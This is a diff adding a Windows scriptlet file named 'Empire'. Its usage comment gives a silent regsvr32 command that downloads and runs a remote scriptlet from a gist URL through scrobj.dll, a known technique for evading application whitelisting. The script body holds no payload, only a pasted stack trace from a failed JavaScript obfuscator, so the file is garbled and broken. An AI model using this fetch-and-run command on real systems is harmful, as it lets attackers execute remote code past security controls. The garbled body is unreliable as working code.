@@ -1,0 +1,31 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{00001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<!-- USAGE -->
+	<!-- regsvr32 /s /n /u /i:https://gist.githubusercontent.com/Elm0D/b5661eb607cfd7f0f352e672a30d192d/raw/d8b428d2b6a0df8b8474f27fe224026363bb2262/Test-MsgBox-Downloader.sct scrobj.dll -->
+	<!-- Credits Of Concept - Casey Smith  -->
+	<script language="JScript">
+		JScriptCodeDom.CodeParseException: current char is not '-' , Line 1, Char 0 ---> System.Exception: current char is not '-'
+   at JScriptCodeDom.CodeReader.ReadHtmlComment()
+   at JScriptCodeDom.CodeReader.ReadToken(Boolean previsexpression)
+   at JScriptCodeDom.CodeReader.PeekToken(Boolean previsexpression)
+   at JScriptCodeDom.CodeParser.InternalParseStatementCore()
+   at JScriptCodeDom.CodeParser.InternalParseStatement()
+   at JScriptCodeDom.CodeParser.ParseStatement()
+   at JScriptCodeDom.CodeParser.ParseBlock()
+   at JScriptCodeDom.CodeParser.Parse(String code, String filename, Int32 lineoffset, Boolean keeplinenum)
+   --- End of inner exception stack trace ---
+   at JScriptCodeDom.CodeParser.Parse(String code, String filename, Int32 lineoffset, Boolean keeplinenum)
+   at ProtectorV1.Protect(String[] codes)
+   at ProtectorV1.Protect(String code)
+   at ASP.javascript_obfuscator_aspx.Button1_Click(Object sender, EventArgs e)
+</script>
+</registration>
+
+</scriptlet>
